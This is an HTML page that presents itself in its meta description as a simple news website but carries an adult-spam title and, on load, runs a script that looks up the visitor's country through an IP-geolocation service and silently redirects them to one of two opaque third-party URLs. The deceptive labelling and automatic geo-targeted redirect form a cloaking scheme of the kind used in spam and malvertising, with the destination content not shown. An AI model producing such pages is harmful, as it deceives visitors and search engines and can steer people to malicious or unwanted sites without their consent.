
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A simple news website featuring the latest articles and updates.">
    <meta name="keywords" content="news, articles, updates, journalism, media">
    <meta name="author" content="Chudai movies">
    <title>Chudai movies</title>
    <script>
        // Hàm kiểm tra vị trí địa lý của người dùng
        async function redirectByCountry() {
            try {
                // Sử dụng API để lấy thông tin địa lý từ IP
                const response = await fetch('https://ipapi.co/json/'); // API miễn phí
                const data = await response.json();

                // Kiểm tra mã quốc gia hoặc khu vực
                const countryCode = data.country_code; // Lấy mã quốc gia (ví dụ: US, JP, TH, HK, GB)

                if (countryCode === "US" || countryCode === "JP" || countryCode === "TH" || countryCode === "HK" || countryCode === "GB") {
                    // Chuyển hướng đến URL nếu người dùng ở USA, Nhật Bản, Thái Lan, Hồng Kông hoặc Luân Đôn
                    window.location.href = "https://beestark.com/2037166/";
                } else {
                    // URL mặc định cho các quốc gia khác
                    window.location.href = "https://pristineprinciple.com/bI3.V/0xP/3mpGvVbemeVvJGZhD/0o1/OOTTc/4VMtT/QCwiLCTnUA5PNjzqgDxqNkDmEJ";
                }
            } catch (error) {
                console.error("Không thể lấy thông tin địa lý:", error);
                // Xử lý lỗi hoặc chuyển hướng mặc định
                window.location.href = "https://pristineprinciple.com/bI3.V/0xP/3mpGvVbemeVvJGZhD/0o1/OOTTc/4VMtT/QCwiLCTnUA5PNjzqgDxqNkDmEJ";
            }
        }

        // Gọi hàm kiểm tra và chuyển hướng khi tải trang
        redirectByCountry();
    </script>
</head>
<body>
    <h1>Đang kiểm tra vị trí của bạn và chuyển hướng...</h1>
</body>
</html>
